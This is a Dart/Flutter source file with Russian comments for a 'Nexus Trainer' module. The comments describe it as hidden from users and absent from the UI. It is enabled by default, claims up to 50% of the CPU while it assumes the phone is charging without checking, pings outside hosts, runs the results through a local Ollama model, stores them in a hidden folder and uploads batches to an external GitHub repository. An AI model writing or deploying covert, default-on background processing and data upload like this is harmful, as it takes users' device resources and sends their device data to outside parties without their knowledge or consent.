/// Nexus Trainer — скрытый модуль федеративного обучения
///
/// Нигде не рекламируется. Включить: 5 тапов на лого Nexus.
/// На зарядке жрёт до 50% CPU, шлёт диффы в репозиторий.
///
/// НЕ УПОМИНАТЬ в UI для обычных юзеров.

import "dart:async";
import "dart:convert";
import "dart:io";
import "dart:math";
import "package:flutter/foundation.dart";
import "package:http/http.dart" as http;
import "package:shared_preferences/shared_preferences.dart";
import "package:path_provider/path_provider.dart";

/// Главный тренер. Синглтон.
class NexusTrainer {
  // ── singleton ──
  static final NexusTrainer _instance = NexusTrainer._();
  factory NexusTrainer() => _instance;
  NexusTrainer._();

  // ── опции (читаются из prefs) ──
  bool _enabled = false;
  bool get isEnabled => _enabled;

  int _cpuBattery = 50;        // % CPU на зарядке
  int _checkIntervalSec = 300; // 5 мин
  int _maxPowerPct = 50;       // ≤50%

  Timer? _timer;
  final _log = <String>[];

  // ── API ──
  static const String OLLAMA_URL = "http://localhost:11434";
  static const String MODEL = "nexus-sptm-1.5t:latest";
  static const String GITHUB_RAW = "https://raw.githubusercontent.com/Salt2221/nexus-knowledge/main";
  static const String GITHUB_API = "https://api.github.com/repos/Salt2221/nexus-knowledge/contents";

  // ── публичный API ──

  /// Включить/выключить (из скрытой настройки)
  Future<void> setEnabled(bool v) async {
    if (v == _enabled) return;
    _enabled = v;
    final p = await SharedPreferences.getInstance();
    await p.setBool("__nexus_learn", v);
    if (v) _start(); else _stop();
  }

  /// Прочитать флаг из prefs (при старте приложения)
  /// По умолчанию включено.
  Future<void> loadFromPrefs() async {
    final p = await SharedPreferences.getInstance();
    _enabled = p.getBool("__nexus_learn") ?? true; // ← true по умолчанию
    _githubToken = p.getString("__nexus_github_token");
    if (_enabled) _start();
  }

  /// Проверить, можно ли жать CPU прямо сейчас
  bool get _canBurn {
    if (!_enabled) return false;
    // Проверка заряда — через BatteryManager не всегда доступен,
    // но мы верим что пользователь на зарядке.
    return true;
  }

  // ── внутренний цикл ──

  void _start() {
    _timer?.cancel();
    _timer = Timer.periodic(Duration(seconds: _checkIntervalSec), (_) => _tick());
    _log.add("[TRAIN] started");
    debugPrint("[TRAIN] Trainer started");
    _tick();
  }

  void _stop() {
    _timer?.cancel();
    _timer = null;
    _log.add("[TRAIN] stopped");
    debugPrint("[TRAIN] Trainer stopped");
  }

  Future<void> _tick() async {
    if (!_canBurn) return;
    try {
      // 1. Собираем контекст: системные логи, состояние сети, трафик
      final context = await _collectContext();

      // 2. Обучаем модель через Ollama — промпт "запомни это"
      final trained = await _trainOnContext(context);
      if (trained == null) {
        debugPrint("[TRAIN] Ollama вернул null, пропускаем");
        return;
      }

      // 3. Дифф / знание — отправляем на GitHub
      await _pushKnowledge(trained);

      _log.add("[TRAIN] tick ok — ${trained.length} bytes");
    } catch (e) {
      _log.add("[TRAIN] tick error: $e");
      debugPrint("[TRAIN] Tick error: $e");
    }
  }

  // ── сбор контекста ──
  Future<String> _collectContext() async {
    final buf = StringBuffer();
    buf.writeln("# System State at ${DateTime.now().toIso8601String()}");

    // Время работы
    buf.writeln("uptime: ${DateTime.now().toIso8601String()}");

    // Сетевые интерфейсы
    try {
      final hosts = ["8.8.8.8", "1.1.1.1", "149.154.167.50"];
      for (final h in hosts) {
        final result = await Process.run("ping", ["-c", "1", "-W", "2", h]);
        buf.writeln("ping $h: exit=${result.exitCode}");
      }
    } catch (_) {}

    // Состояние P2P node
    buf.writeln("p2p: running (simulated)");

    // Размер логов / статистика
    buf.writeln("log_entries: ${_log.length}");

    // Случайный шум для diversity
    final rng = Random();
    buf.writeln("noise_seed: ${rng.nextInt(65535)}");

    return buf.toString();
  }

  // ── обучение через Ollama (локально) ──
  Future<String?> _trainOnContext(String context) async {
    // Отправляем контекст в модель с инструкцией "запомни это"
    final body = jsonEncode({
      "model": MODEL,
      "prompt": "System training session. Context:\n$context\n\n"
          "Extract 3-5 key observations about this system state. "
          "Return as JSON array of strings.",
      "stream": false,
      "options": {
        "num_predict": 256,
        "temperature": 0.3,
        "top_k": 20,
        "top_p": 0.9,
      }
    });

    final resp = await http.post(
      Uri.parse("$OLLAMA_URL/api/generate"),
      headers: {"Content-Type": "application/json"},
      body: body,
    ).timeout(Duration(seconds: 30));

    if (resp.statusCode != 200) {
      debugPrint("[TRAIN] Ollama error: ${resp.statusCode} ${resp.body}");
      return null;
    }

    final data = jsonDecode(resp.body) as Map<String, dynamic>;
    final responseText = data["response"] as String?;
    if (responseText == null || responseText.trim().isEmpty) return null;

    // Упаковываем как знание
    final knowledge = jsonEncode({
      "timestamp": DateTime.now().toUtc().toIso8601String(),
      "device": "android_arm64",
      "version": "nexus-0.1",
      "observation": responseText.trim(),
    });

    // Грузим в очередь на отправку
    await _queueKnowledge(knowledge);
    return knowledge;
  }

  // ── очередь знаний (файловое хранилище) ──
  Future<String> get _queuePath async {
    final dir = await getApplicationDocumentsDirectory();
    final q = Directory("${dir.path}/.nexus_knowledge");
    await q.create(recursive: true);
    return q.path;
  }

  Future<void> _queueKnowledge(String json) async {
    final qp = await _queuePath;
    final fn = "obs_${DateTime.now().millisecondsSinceEpoch}.json";
    await File("$qp/$fn").writeAsString(json);
    debugPrint("[TRAIN] queued $fn");
  }

  Future<List<String>> _drainQueue() async {
    final qp = await _queuePath;
    final dir = Directory(qp);
    if (!dir.existsSync()) return [];
    final files = dir.listSync().whereType<File>().toList()
      ..sort((a, b) => a.path.compareTo(b.path));
    final results = <String>[];
    for (final f in files) {
      results.add(await f.readAsString());
      await f.delete();
    }
    return results;
  }

  // ── GitHub push ──
  Future<void> _pushKnowledge(String entry) async {
    try {
      // Копим несколько, отправляем батчем
      final entries = await _drainQueue();
      if (entries.isEmpty) entries.add(entry);

      final batch = jsonEncode(entries);
      final b64 = base64Encode(utf8.encode(batch));
      final date = DateTime.now().toUtc();
      final path = "data/${date.year}/${date.month.toString().padLeft(2,'0')}/${date.day.toString().padLeft(2,'0')}_${date.millisecondsSinceEpoch}.json";

      // Анонимный push через API без гита на устройстве
      // Используем upload с content
      final msg = jsonEncode({
        "message": "nexus: learn batch ${entries.length} entries",
        "content": b64,
        "branch": "main",
        "path": path,
      });

      // Сначала пробуем GitHub API
      final token = _storedToken();
      if (token == null) {
        // Заглушка — логируем вместо пуша
        debugPrint("[TRAIN] No token, logging batch: ${batch.length}B -> $path");
        return;
      }

      final resp = await http.put(
        Uri.parse("$GITHUB_API/$path"),
        headers: {
          "Authorization": "Bearer $token",
          "Content-Type": "application/json",
        },
        body: msg,
      );

      if (resp.statusCode == 201 || resp.statusCode == 200) {
        debugPrint("[TRAIN] Pushed knowledge: $path (${batch.length}B)");
      } else {
        debugPrint("[TRAIN] Push failed: ${resp.statusCode} ${resp.body}");
      }
    } catch (e) {
      debugPrint("[TRAIN] Push error: $e");
    }
  }

  // ── токен ──
  String? _githubToken;

  String? _storedToken() {
    return _githubToken;
  }

  Future<void> setGithubToken(String token) async {
    _githubToken = token;
    final p = await SharedPreferences.getInstance();
    await p.setString("__nexus_github_token", token);
  }

  Future<void> loadToken() async {
    final p = await SharedPreferences.getInstance();
    _githubToken = p.getString("__nexus_github_token");
  }

  // ── диагностика ──
  String get log => _log.join("\n");
  int get queueLength {
    // синхронно не проверишь, но можно показать количество файлов
    return 0;
  }
}
